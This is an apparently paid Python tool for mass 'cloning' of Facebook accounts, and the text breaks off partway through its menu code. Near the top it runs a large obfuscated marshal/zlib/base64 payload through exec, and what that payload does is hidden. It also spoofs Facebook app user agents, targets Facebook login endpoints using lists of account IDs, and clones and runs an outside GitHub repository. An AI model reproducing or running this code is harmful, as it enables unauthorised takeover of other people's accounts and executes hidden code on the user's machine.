# This script is written by Sheraz khan 03263036857

import os,sys,glob,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re,hashlib
import datetime,subprocess
import zipfile
import marshal
from uuid import uuid4
from time import sleep as sp
####import lt
os.system('pip install pycurl')
os.system("clear")
print('\x1b[1;92m [√] MR SHERAZ XD:)🔥️')
########print('\x1b[1;92m [√] Join Facebook group 🔥️')
#########os.system('xdg-open https://chat.whatsapp.com/G00ga0XtfTU7y6Fvlq3jEc')

hashes = []
#<<_________[ PROTECT-DATA-CAPTURE-&-BYPASS ]_________>>#
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf34\x00\x00\x00\x97\x00d\x00\x84\x00Z\x00\x02\x00e\x01\x02\x00e\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x02S\x00)\x03c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x03\x00\x00\x00\xf3\xd8\x00\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00d\x00d\x00d\x04\x85\x03\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00)\x05N\xda\x07marshal\xda\x04zlib\xda\x06base64\xe9\xff\xff\xff\xff)\x04\xda\n__import__\xda\x05loads\xda\ndecompress\xda\tb64decode)\x01\xda\x02__s\x01\x00\x00\x00 \xfa\x01 \xfa\x08<lambda>r\r\x00\x00\x00\x01\x00\x00\x00sY\x00\x00\x00\x80\x00\x95\n\x989\xd1\x10%\xd4\x10%\xd7\x10+\xd2\x10+\xadJ\xb0v\xd1,>\xd4,>\xd7,I\xd2,I\xcd*\xd0U]\xd1J^\xd4J^\xd7Jh\xd2Jh\xd0ik\xd0lp\xd0lp\xd0np\xd0lp\xd4iq\xd1Jr\xd4Jr\xd1,s\xd4,s\xd1\x10t\xd4\x10t\x80\x00\xf3\x00\x00\x00\x00s4#\x00\x00=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)\x02\xda\x01_\xda\x04exec\xa9\x00r\x0e\x00\x00\x00r\x0c\x00\x00\x00\xfa\x08<module>r\x12\x00\x00\x00\x01\x00\x00\x00sY\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x04t\xd0\x04t\x80\x01\xd0uy\xd0uy\xd0{|\xd0{|\xf0\x00\x00\x7f\x01vN\x02\xf1\x00\x00{\x01wN\x02\xf4\x00\x00{\x01wN\x02\xf1\x00\x00v\x01xN\x02\xf4\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02r\x0e\x00\x00\x00'))
#####_____________onlinr set-up__________#########
def iAmMethod2Ua():
	abc = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
	pkgs = random.choice(['com.facebook.katana','com.facebook.mlite','com.facebook.lite','com.facebook.adsmanager','com.facebook.liteh'])
	build = random.choice(abc)+random.choice(abc)+random.choice(abc)
	FBBV = str(random.randint(111111111,999999999))
	FBCR = random.choice(["Jazz","Zong","Mobilink","Ufone","Telenor","Warid","Djuice","Vodafone"])
	sm = f"SM-G{random.randint(880,975)}U"
	ua = f"Dalvik/2.1.0 (Linux; U; Android {random.randint(6,13)}; {sm} Build/TP1A.220{random.randint(620,650)}.014) [FBAN/FB4A;FBAV/273.0.0.39.123;FBBV/218047{random.randint(900,980)};FBDM/"+"{density=2.625,width=1080,height=2042};"+f"FBLC/en_US;FBRV/219312{random.randint(790,810)};FBCR/{FBCR};FBMF/samsung;FBBD/samsung;FBPN/{pkgs};FBDV/{sm};FBSV/{random.randint(4,14)};FBOP/1;FBCA/arm64-v8a:;]"
	return ua
##############_________#########
def iAmMethod100Ua():
        samsung_models = [
            "SM-P610|P610XXS3FWD2",
            "SM-T595|T595XXU4CVG4",
            "SM-A107M|A107MUBS6CWD3",
            "SM-A307GT|A307GTVJS5CWE2",
            "SM-G991U|G991USQS8EWG1",
            "SM-G985F|G985FXXSIHWGA",
            "SM-N985F|N985FXXS7HWG1",
            "SM-A515F|A515FXXU7HWF1",
            "SM-A725F|A725FXXU6DWE3",
            "SM-M315F|M315FXXU3CWA2",
            "SM-F916U|F916USQS2JWE4",]
        model_,build = random.choice(samsung_models).rsplit('|')
        os_v = random.randint(4, 13)
        fbav = f"{os_v}.0.{random.randint(111, 999)}.{random.randint(111, 999)}"
        ua = ('[FBAN/Orca-Android;FBAV/'+str(fbav)+';FBPN/com.facebook.orca;FBLC/bn_BD;FBBV/'+str(random.randint(111111111,999999999))+';FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/'+str(model_)+'/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;]')
        return ua
#########____________#######
def iAmMethod20Ua():
    application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    application_version_code=str(random.randint(000000000,999999999))
    android_version=str(random.randrange(6,13))
    numbr = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
    build = random.choice(["OPD2302.", "SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])
    fbs = random.choice(["com.facebook.adsmanager", "com.facebook.lite", "com.facebook.orca", "com.facebook.katana", "com.facebook.mlite"])
    ua = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; BLU Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=1.5,width=720,height=1208};'+f'FBLC/en_US;FBRV;FBRV/{str(application_version_code)};FBCR/HO"+"T_m"+"obi"+"le;FBMF/So"+"ny;FBBD/So"+"ny;FBPN/{str(fbs)};FBDV/D2"+"5"+"02;FBSV/5."+"1.1;nullFBCA/armeabi-v7a:armeabi;]'
    return ua
##########_____________--------#####
def X1():
    rr = random.randint
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+".0.0."+str(random.randrange(9,49))+str(random.randint(11,77))
    b = f"[FBAN/FB4A;FBAV/{str(rr(310,350))}.0.0.{str(rr(1,9))}.{str(rr(50,110))};FBPN/com.facebook.katana;FBLC/en_US;FBBV/{str(rr(310000000,399999999))};FBCR/MTN;FBMF/TECNO MOBILE LIMITED;FBBD/TECNO;FBDV/TECNO CH6;FBSV/12;FBCA/arm64-v8a:null;FBDM/"+"{density=3.0,width=1080,height=2351};FB_FW/1;FBRV/0;] FBBK/1"
    ua = a+b
    return ua
##########
def iAmMethod1Ua():
	abc = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
	pkgs = random.choice(['com.facebook.katana','com.facebook.mlite','com.facebook.lite','com.facebook.adsmanager','com.facebook.liteh'])
	build = random.choice(abc)+random.choice(abc)+random.choice(abc)
	FBBV = str(random.randint(111111111,999999999))
	FBCR = random.choice(["Jazz","Zong","Mobilink","Ufone"])
	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))[FBAN/FB4A;FBAV/34.0.0.3318;FBBV/3438742;[FBAN/FB4A;FBAV/196.0.0.79;FBBV/442082200;FBDM/{density=2.0,width=1280,height=1440};FBLC/en_AU;FBRV/886067563;FBCR/MobileNation;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX1971;FBSV/10.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",])
	return ua
#####_____________Timeanddate____########
import time
from datetime import date
from datetime import datetime
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#####_______________&&&&&&&&&____#####
try:
	import bs4
	from bs4 import BeautifulSoup as pars
except ModuleNotFoundError:
	os.system('pip install bs4')
except Exception as e:
	print(e)
from concurrent.futures import ThreadPoolExecutor as tpe
import requests
from requests.exceptions import ConnectionError as CE
##______COLORS____ARE________######
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'
PURPLE ='\x1b[38;5;46m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
EXTRA ='\x1b[38;5;208m'
###########__________defline___________#############
def line():
	print(49*'=')

def p(x):
	print(x)
#__________________ [ Lists Used in Script]______________
id = []
ok = []
cp = []
loop = 0
method=[]
SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
ses = requests.Session()
def logo():
	sys.stdout.write('\x1b]2; SHERAZ XD:)\x07')
	os.system('clear')
	logo = (f'''
    ######   ##     ## ######## 
    ##   ##  ###   ###      ##  
    ##       #### ####     ##   
    ######   ## ### ##    ##    
         ##  ##     ##   ##     
    ##   ##  ##     ##  ##      
    ######   ##     ## ########  x (A)
     \033[91;1m Just feel 
\033[1;97m ------------------------------------------------
 [•] Owner    : Sheraz King
 [•] GitHub   : Sheraz king 312
 [•] Status   : Paid
 [•] Version  : 3.0
\033[1;39m ------------------------------------------------''')
	p(logo)
def clear():
	print('\033[1;32m-------------------------------------------------')
	os.system("clear")
####_______________________&_______________############
class iAmMain:
	def __init__(self):
		self.gp = "https://b-graph.facebook.com/auth/login"
		self.ap = "https://b-api.facebook.com/auth/login"
	def iAmMenu(self):
		#heck_again()
		logo()
		p(" [\033[91;1m1\033[1;37m] File Cloning ")
		p(" [\033[91;1m2\033[1;37m] Create File ")
		p(" [\033[91;1m3\033[1;37m] Cut Used Files Lines ")
		p(" [\033[91;1m4\033[1;37m] Password change")
		
		p(" [\033[91;1mE\033[1;37m] Exit Tool ")
		line()
		opt1 = input(" [•] Select An Option : ")
		if opt1 == "1":self.file_menu()
		if opt1 == "2":self.dump_menu()
		elif opt1 == "3":Grep().with_names()
		elif opt1 == "4":automation().iAmPasswordManager()
		elif opt1 == "5":Join().Whatsapp()
		elif opt1 == "E":exit(" [•] Good Bye !!!!!!! ")
		else:p(" [•] Wrong Select ");sp(2);self.iAmMenu()
########___________________FILE_dump__________#########
	def dump_menu(self):
		os.system("cd && git clone --depth=1 https://github.com/Hannan-404/FILE")
		os.system('cd && cd FILE ;python FILE.py')
########___________________FILE_Menu________############
	def file_menu(self):
		#check_again()
		logo()
		p(" [•] \033[1;37mExample \033[92;1m/sdcard/filename.txt\033[1;37m")
		file = input(" [•] \033[1;37mPut File Path : ")
		try:
			id = open(file,"r").read().splitlines()
			self.method_select(id)
		except FileNotFoundError:
			p(" [•] File Path Incorrect ")
